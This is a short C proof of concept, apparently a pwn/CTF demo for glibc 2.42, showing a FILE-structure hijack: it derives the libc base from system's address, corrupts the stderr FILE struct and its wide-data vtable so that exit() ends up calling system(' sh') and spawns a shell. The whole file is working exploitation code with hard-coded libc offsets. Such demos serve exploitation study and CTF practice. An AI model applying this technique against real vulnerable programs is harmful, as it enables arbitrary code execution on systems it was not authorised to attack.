// glibc 2.42
// https://github.com/nosurfer

#include <stdio.h>
#include <stdlib.h>

char* stderr2;

int main() {
    size_t system_addr = (size_t)&system;
    size_t libc_base_addr = system_addr - 0x53b00;
    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x20a4e0;
    size_t _IO_wfile_jumps_addr = libc_base_addr + 0x208228;

    stderr2 = (char*) _IO_2_1_stderr_addr;
    char *wide_data = calloc(0x200, 1);
    char *wide_vtable = calloc(0x200, 1);

    // _wide_data
    *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
    
    // _IO_2_1_stdout_
    *(size_t *)(stderr2) = (size_t) 0x687320; // \x20sh
    *(size_t *)(stderr2 + 0xd8) = (size_t) _IO_wfile_jumps_addr; // offset of seekof
    *(size_t *)(stderr2 + 0xa0) = (size_t) wide_data;
    // _IO_flush_all: fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    // *(int    *)(stderr2 + 0xc0) = (int) 0; // _mode
    // *(size_t *)(stderr2 + 0x28) = (size_t) 1; // _IO_write_ptr
    *(size_t *)(stderr2 + 0x20) = (size_t) 0; // _IO_write_base

    // _wide_data->vtable
    *(size_t *)(wide_vtable + 0x68) = (size_t) &system;

    exit(0);
}

__attribute__((constructor)) void
buf_init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
